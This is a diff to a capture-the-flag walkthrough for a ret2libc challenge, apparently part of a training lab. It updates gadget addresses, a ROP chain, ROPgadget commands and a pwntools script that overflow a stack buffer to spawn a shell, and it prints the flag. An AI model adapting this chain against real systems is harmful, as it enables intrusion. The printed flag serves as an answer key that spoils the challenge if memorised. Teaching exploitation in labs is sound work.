@@ -28,12 +28,12 @@ enabled**, so:
 
 So you **reuse existing code**: chain gadgets to call `system("/bin/sh")`.
 
-## The ingredients (all at fixed addresses, the binary is `-no-pie`)
+## The ingredients (all at fixed addresses; the binary is `-no-pie` and statically linked)
 
 Find them in the downloaded binary, Ghidra shows them all, or on the command line:
 
 ```bash
-objdump -d -M intel ./ret2libc | grep '<system@plt>:'   # system@plt
+nm ./ret2libc | grep ' system$'                         # system (linked from static libc)
 ROPgadget --binary ./ret2libc | grep ': pop rdi ; ret'  # pop rdi; ret gadget
 ROPgadget --binary ./ret2libc --string '/bin/sh'        # the "/bin/sh" string
 ```
@@ -41,14 +41,15 @@ ROPgadget --binary ./ret2libc --string '/bin/sh'        # the "/bin/sh" string
 (The **Debug** dial's **ROP ingredients** panel lists the same addresses, but you
 never need it; everything here works from the downloaded binary alone.)
 
-In the shipped build (read the *current* values, they are build-specific):
+In the shipped build (read the *current* values, they are build-specific, and a
+static libc binary has many `pop rdi; ret` gadgets, any one works):
 
 | ingredient        | address     |
 |-------------------|-------------|
-| `system@plt`      | `0x401040`  |
-| `"/bin/sh"`       | `0x402008`  |
-| `pop rdi; ret`    | `0x401156`  |
-| bare `ret`        | `0x401157`  (the byte right after `pop rdi`) |
+| `system`          | `0x404b80`  |
+| `"/bin/sh"`       | `0x4795a5`  |
+| `pop rdi; ret`    | `0x402121`  |
+| bare `ret`        | `0x402122`  (the byte right after `pop rdi`) |
 
 ## The chain
 
@@ -60,7 +61,7 @@ To call `system("/bin/sh")` you need RDI = address of `"/bin/sh"`, then call
 [ ret                   ]   16-byte stack alignment (see below)
 [ pop rdi ; ret         ]   pop the next value into RDI...
 [ &"/bin/sh"            ]   ...which is the string's address
-[ system@plt            ]   call system(RDI) = system("/bin/sh")
+[ system                ]   call system(RDI) = system("/bin/sh")
 ```
 
 ### The alignment gotcha
@@ -78,10 +79,11 @@ same stdin your payload came in on. The vulnerable `read` only consumed the firs
 64 bytes, so pad your chain to exactly 64 bytes and then append a command:
 
 ```
-<chain, padded to 64 bytes>cat /flag
+<chain, padded to 64 bytes>cat flag.txt
 ```
 
-The shell reads `cat /flag` and runs it:
+The shell reads `cat flag.txt` and runs it (its working directory is where the
+server launches the binary, and the flag lives there, outside the web root):
 
 - **Flag:** `R0pP4stTh3NX`
 
@@ -106,8 +108,10 @@ void vuln(void)
 - A **stack canary** would catch this overflow before `vuln()` returns (try adding
   `-fstack-protector-all` in the Fix editor's flags field, the chain gets caught,
   signal 6).
-- **PIE + ASLR** would randomize `system@plt`, `"/bin/sh"`, and the gadget, so your
+- **PIE + ASLR** would randomize `system`, `"/bin/sh"`, and the gadget, so your
   fixed addresses would miss, until you add an **info leak** to recover the base.
+  (This `-no-pie` static build keeps them fixed; `gcc` ignores `-pie` under
+  `-static`, so PIE/ASLR is the next rung's lesson, not a toggle on this binary.)
 - **CFI / shadow stacks** (Intel CET) break return-address hijacking more
   fundamentally, but are not universally deployed.
 
@@ -116,7 +120,7 @@ Each is defense in depth; the actual fix is bounding the read.
 ## Professional tools
 
 None of this uses the challenge's debug view, you work from the downloaded binary.
-**Ghidra** decompiles `ret2libc` so you can read `vuln()` and spot the imported
+**Ghidra** decompiles `ret2libc` so you can read `vuln()` and spot the linked-in
 `system`, the `"/bin/sh"` string, and the gadget without running anything.
 **ROPgadget** finds gadgets and strings; **pwntools** builds and packs the chain:
 
@@ -130,7 +134,7 @@ rop.system(next(e.search(b'/bin/sh\x00')))   # pop rdi; /bin/sh; system
 
 payload  = b'A' * 24 + rop.chain()
 payload  = payload.ljust(64, b'B')     # read() consumes exactly 64 bytes...
-payload += b'cat /flag\n'              # ...the rest is the shell's input
+payload += b'cat flag.txt\n'           # ...the rest is the shell's input
 
 p = process('./ret2libc')
 p.send(payload)
